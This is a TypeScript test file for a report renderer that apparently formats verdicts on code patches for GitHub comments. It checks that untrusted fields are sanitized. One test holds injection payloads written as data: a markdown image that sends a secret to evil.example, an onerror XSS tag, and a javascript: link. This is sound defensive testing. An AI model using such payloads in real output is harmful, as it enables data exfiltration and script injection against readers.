import { describe, expect, it } from "vitest";
import { MAX_REPORT_CHARS, inert, renderMarkdown } from "../core/report.js";
import type { JudgeRun } from "../core/types.js";

function baseRun(overrides: Partial<JudgeRun> = {}): JudgeRun {
  return {
    id: "run_test",
    repoPath: "/repo",
    taskPath: "/task.md",
    patchPath: "/patch.diff",
    startedAt: "now",
    completedAt: "later",
    verification: [],
    diff: {
      files: [],
      totalAdded: 0,
      totalDeleted: 0,
      testFilesTouched: 0,
      dependencyFilesTouched: [],
      configFilesTouched: [],
      ciFilesTouched: [],
      deletedAssertions: 0,
      addedSkips: 0,
    },
    findings: [],
    scores: { correctness: 100, tests: 100, scope: 100, architecture: 100, risk: 100, maintainability: 100, total: 100 },
    verdict: "MERGE",
    confidence: 0.7,
    ...overrides,
  };
}

describe("renderMarkdown", () => {
  it("renders a 30-second verdict summary", () => {
    const md = renderMarkdown(baseRun());
    expect(md).toContain("# MergeCode Verdict: MERGE");
    expect(md).toContain("## Review This First");
    expect(md).toContain("## Diff Summary");
  });

  it("neutralizes markdown/HTML injection from untrusted fields", () => {
    const evil = "![x](https://evil.example/?d=secret) <img src=x onerror=alert(1)> @someone [click](javascript:alert(1))";
    const run = baseRun({
      llmSummary: `${evil}\n# Fake heading`,
      findings: [{ severity: "high", category: "risk", title: evil, detail: evil, file: "a\n## injected" }],
      diff: {
        ...baseRun().diff,
        files: [
          {
            path: "src/<b>x</b>.ts",
            added: 1,
            deleted: 0,
            isTest: false,
            category: "source",
            deletedAssertions: 0,
            addedSkips: 0,
          },
        ],
      },
    });
    const md = renderMarkdown(run);
    expect(md).not.toMatch(/!\[x\]\(/);
    expect(md).not.toMatch(/\[click\]\(/);
    expect(md).not.toContain("<img");
    expect(md).not.toContain("<b>");
    expect(md).not.toMatch(/(^|\s)@someone/);
    expect(md).not.toMatch(/^#+ (Fake heading|injected)/m);
  });

  it("defangs GitHub extended autolinks (www. and emails) in untrusted text", () => {
    const out = inert("see www.evil.example/login or WWW.Evil.example and mail admin@evil.example");
    expect(out).not.toMatch(/www\./i);
    expect(out).not.toMatch(/admin@evil/);
  });

  it("caps very large reports below GitHub's comment limit", () => {
    const files = Array.from({ length: 5000 }, (_, i) => ({
      path: `src/very/long/path/number/${i}/file-with-a-long-name.ts`,
      added: 1,
      deleted: 1,
      isTest: false,
      category: "source" as const,
      deletedAssertions: 0,
      addedSkips: 0,
    }));
    const md = renderMarkdown(baseRun({ diff: { ...baseRun().diff, files } }));
    expect(md.length).toBeLessThanOrEqual(MAX_REPORT_CHARS);
    expect(md).toContain("truncated");
  });
});
